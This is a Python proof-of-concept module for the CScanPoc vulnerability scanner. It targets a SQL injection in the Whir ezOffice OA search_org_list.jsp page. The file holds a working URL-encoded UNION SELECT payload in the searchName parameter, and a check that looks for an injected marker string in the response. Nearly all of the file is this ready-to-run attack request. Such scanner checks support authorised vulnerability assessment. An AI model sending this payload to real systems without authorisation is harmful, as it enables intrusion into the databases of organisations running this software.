# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Whir_0004' # 平台漏洞编号，留空
    name = '万户ezOffice所有版本通用型SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-05-11'  # 漏洞公布时间
    desc = '''
        万户ezOffice /defaultroot/public/select_user/search_org_list.jsp页面过滤不严谨，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '万户OA'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '7e97cbe2-5000-4319-8015-9cc8fcb3047a'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #ref: http://wooyun.org/bugs/wooyun-2015-0113025
            payload = "1%27%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%29%2bCHAR%28118%29%2bCHAR%28117%29%2bCHAR%28115%29%2bCHAR%28113%29%2bCHAR%2899%29%2bCHAR%28118%29%2bCHAR%28113%29--"
            path = '/defaultroot/public/select_user/search_org_list.jsp?searchName='
            verify_url = self.target + path + payload
            req = requests.get(verify_url)
            
            if req.status_code == 200 and "qvusqcvq" in req.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
